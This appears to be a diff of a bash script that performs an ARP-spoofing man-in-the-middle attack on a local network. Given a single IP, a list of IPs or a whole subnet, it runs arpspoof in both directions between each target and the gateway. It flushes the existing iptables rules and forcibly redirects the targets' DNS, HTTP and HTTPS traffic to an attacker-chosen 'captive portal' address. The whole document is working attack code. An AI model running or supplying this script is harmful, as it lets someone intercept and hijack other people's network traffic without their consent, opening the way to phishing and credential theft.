@@ -1,53 +1,27 @@
 #!/bin/bash
 
-# Prompt user for network interface
-read -p "Enter the network interface (e.g., wlan0): " INTERFACE
+# Install required tools
+apt-get install dsniff iptables ipcalc -y
 
-# Prompt user for captive portal IP
-read -p "Enter the captive portal IP (e.g., 192.168.1.10): " PORTAL_IP
+# Prompt user for input
+echo "Enter target IP(s) (single IP, multiple IPs separated by commas, or subnet with mask, e.g., 192.168.1.0/24):"
+read -p "> " target_input
 
-# Prompt user for device IP (to exempt)
-read -p "Enter this device's IP (to exempt): " DEVICE_IP
+# Prompt for interface
+echo "Enter network interface (e.g., wlan0):"
+read -p "> " interface
 
-# Prompt user for gateway IP (to exempt)
-read -p "Enter the gateway IP (to exempt): " GATEWAY_IP
+# Prompt for captive portal IP
+echo "Enter captive portal IP (e.g., 192.168.1.10):"
+read -p "> " portal_ip
 
-# Prompt user for target selection
-echo "Select target(s) for redirection:"
-echo "1) Single IP"
-echo "2) Multiple IPs (comma-separated)"
-echo "3) All IPs in a subnet"
-read -p "Enter option (1-3): " TARGET_OPTION
+# Prompt for gateway IP
+echo "Enter gateway IP (e.g., 192.168.1.1):"
+read -p "> " gateway_ip
 
-# Initialize target IP array
-declare -a TARGET_IPS
-
-# Handle target selection
-case $TARGET_OPTION in
-  1)
-    read -p "Enter the single target IP: " SINGLE_IP
-    TARGET_IPS=("$SINGLE_IP")
-    ;;
-  2)
-    read -p "Enter multiple target IPs (comma-separated, no spaces): " MULTIPLE_IPS
-    IFS=',' read -r -a TARGET_IPS <<< "$MULTIPLE_IPS"
-    ;;
-  3)
-    read -p "Enter the subnet (e.g., 192.168.1.0/24): " SUBNET
-    # Use ipcalc to generate all IPs in the subnet
-    IP_LIST=$(ipcalc "$SUBNET" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u)
-    # Convert IP list to array, excluding device and gateway IPs
-    while IFS= read -r ip; do
-      if [[ "$ip" != "$DEVICE_IP" && "$ip" != "$GATEWAY_IP" ]]; then
-        TARGET_IPS+=("$ip")
-      fi
-    done <<< "$IP_LIST"
-    ;;
-  *)
-    echo "Invalid option. Exiting."
-    exit 1
-    ;;
-esac
+# Prompt for device IP (to exempt)
+echo "Enter device IP to exempt (e.g., 192.168.1.100):"
+read -p "> " device_ip
 
 # Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -56,36 +30,94 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -F
 iptables -t nat -F
 
-# Redirect hardcoded DNS traffic to 8.8.8.8 to captive portal
-iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp -d 8.8.8.8 --dport 53 -j DNAT --to-destination "$PORTAL_IP"
+# Function to validate IP address
+validate_ip() {
+    local ip=$1
+    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+        return 0
+    else
+        return 1
+    fi
+}
 
-# Redirect DNS traffic (UDP and TCP) to captive portal, exempting device and gateway IPs
-iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 ! -s "$DEVICE_IP" ! -d "$GATEWAY_IP" -j DNAT --to-destination "$PORTAL_IP"
-iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 ! -s "$DEVICE_IP" ! -d "$GATEWAY_IP" -j DNAT --to-destination "$PORTAL_IP"
+# Function to process IPs
+process_ips() {
+    local input=$1
+    local ip_list=()
+
+    # Check if input is a subnet (contains '/')
+    if [[ $input =~ "/" ]]; then
+        # Use ipcalc to get IP range and convert to individual IPs
+        ip_range=$(ipcalc "$input" | grep HostMin | awk '{print $2}' | head -1)
+        ip_max=$(ipcalc "$input" | grep HostMax | awk '{print $2}' | head -1)
+
+        # Convert range to individual IPs
+        IFS=. read -r i1 i2 i3 i4 <<< "$ip_range"
+        IFS=. read -r j1 j2 j3 j4 <<< "$ip_max"
+        
+        start=$(( (i1 << 24) + (i2 << 16) + (i3 << 8) + i4 ))
+        end=$(( (j1 << 24) + (j2 << 16) + (j3 << 8) + j4 ))
+
+        for ((ip=start; ip<=end; ip++)); do
+            ip_addr=$(( (ip >> 24) & 255 )).$(( (ip >> 16) & 255 )).$(( (ip >> 8) & 255 )).$(( ip & 255 ))
+            # Skip device IP and gateway IP
+            if [ "$ip_addr" != "$device_ip" ] && [ "$ip_addr" != "$gateway_ip" ] && [ "$ip_addr" != "$portal_ip" ]; then
+                ip_list+=("$ip_addr")
+            fi
+        done
+    else
+        # Handle single or multiple IPs
+        IFS=',' read -ra ip_array <<< "$input"
+        for ip in "${ip_array[@]}"; do
+            ip=$(echo "$ip" | tr -d '[:space:]') # Remove whitespace
+            if validate_ip "$ip" && [ "$ip" != "$device_ip" ] && [ "$ip" != "$gateway_ip" ] && [ "$ip" != "$portal_ip" ]; then
+                ip_list+=("$ip")
+            fi
+        done
+    fi
+
+    echo "${ip_list[@]}"
+}
+
+# Process the target input
+target_ips=($(process_ips "$target_input"))
+
+# Check if any valid IPs were found
+if [ ${#target_ips[@]} -eq 0 ]; then
+    echo "No valid target IPs found or all IPs were exempted."
+    exit 1
+fi
+
+# Redirect DNS traffic (UDP and TCP) to captive portal
+iptables -t nat -A PREROUTING -i "$interface" -p udp --dport 53 -j DNAT --to-destination "$portal_ip"
+iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 53 -j DNAT --to-destination "$portal_ip"
+
+# Redirect hardcoded user DNS (e.g., Google DNS)
+iptables -t nat -A PREROUTING -i "$interface" -p udp -d 8.8.8.8 --dport 53 -j DNAT --to-destination "$portal_ip"
+iptables -t nat -A PREROUTING -i "$interface" -p udp -d 8.8.4.4 --dport 53 -j DNAT --to-destination "$portal_ip"
 
 # Allow access to the captive portal
-iptables -t nat -A PREROUTING -i "$INTERFACE" -d "$PORTAL_IP" -j ACCEPT
+iptables -t nat -A PREROUTING -i "$interface" -d "$portal_ip" -j ACCEPT
+
+# Exempt device IP and gateway IP
+iptables -t nat -A PREROUTING -i "$interface" -s "$device_ip" -j ACCEPT
+iptables -t nat -A PREROUTING -i "$interface" -d "$device_ip" -j ACCEPT
+iptables -t nat -A PREROUTING -i "$interface" -s "$gateway_ip" -j ACCEPT
+iptables -t nat -A PREROUTING -i "$interface" -d "$gateway_ip" -j ACCEPT
 
 # Redirect HTTP/HTTPS traffic to captive portal for target IPs
-for TARGET_IP in "${TARGET_IPS[@]}"; do
-  if [[ "$TARGET_IP" != "$DEVICE_IP" && "$TARGET_IP" != "$GATEWAY_IP" ]]; then
-    iptables -t nat -A PREROUTING -i "$INTERFACE" -s "$TARGET_IP" -p tcp --dport 80 -j DNAT --to-destination "$PORTAL_IP"
-    iptables -t nat -A PREROUTING -i "$INTERFACE" -s "$TARGET_IP" -p tcp --dport 443 -j DNAT --to-destination "$PORTAL_IP"
-  fi
+for ip in "${target_ips[@]}"; do
+    iptables -t nat -A PREROUTING -i "$interface" -s "$ip" -p tcp --dport 80 -j DNAT --to-destination "$portal_ip"
+    iptables -t nat -A PREROUTING -i "$interface" -s "$ip" -p tcp --dport 443 -j DNAT --to-destination "$portal_ip"
 done
 
 # Masquerade outgoing traffic
-iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
+iptables -t nat -A POSTROUTING -o "$interface" -j MASQUERADE
 
-# Save iptables rules
-iptables-save > /etc/iptables/rules.v4
-
-# Start ARP spoofing for each target IP
-for TARGET_IP in "${TARGET_IPS[@]}"; do
-  if [[ "$TARGET_IP" != "$DEVICE_IP" && "$TARGET_IP" != "$GATEWAY_IP" ]]; then
-    arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY_IP" &
-    arpspoof -i "$INTERFACE" -t "$GATEWAY_IP" "$TARGET_IP" &
-  fi
+# Start bidirectional ARP spoofing for each target IP
+for ip in "${target_ips[@]}"; do
+    arpspoof -i "$interface" -t "$ip" "$gateway_ip" &
+    arpspoof -i "$interface" -t "$gateway_ip" "$ip" &
 done
 
-echo "Captive portal redirection and ARP spoofing started for selected targets."
+echo "Captive portal redirection and ARP spoofing started for target IPs."
